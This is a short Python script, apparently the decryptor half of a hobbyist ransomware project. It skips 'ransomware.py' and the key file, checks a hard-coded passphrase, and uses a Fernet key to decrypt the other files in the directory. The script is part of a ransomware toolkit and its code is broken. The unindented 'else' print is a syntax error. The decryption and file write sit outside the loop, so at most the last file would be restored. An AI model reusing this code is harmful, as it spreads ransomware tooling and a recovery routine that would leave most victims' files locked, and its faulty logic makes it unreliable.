import os
from cryptography.fernet import Fernet

#find files
Files = []

for file in os.listdir():
  if file == "ransomware.py" or file == "thekey.key":
    continue
  if os.path.isfile(file):
    Files.append(file)

with open("thekey.key", "rb") as key:
  secretkey = key.read()
  
secretphrase = "I love you"
user_phrase = input("Enter the secret phrase: ")

if user_phrase == secretphrase:
        for file in Files:
              with open(file, "rb") as thefile:
                  content = thefile.read()
        content_decryted = Fernet(secretkey).decrypt(content)
        with open(file, "wb") as thefile:
            thefile.write(content_decryted)
        print("Files decrypted successfully")
else:
print("Incorrect secret phrase. Decryption failed." , user_phrase)
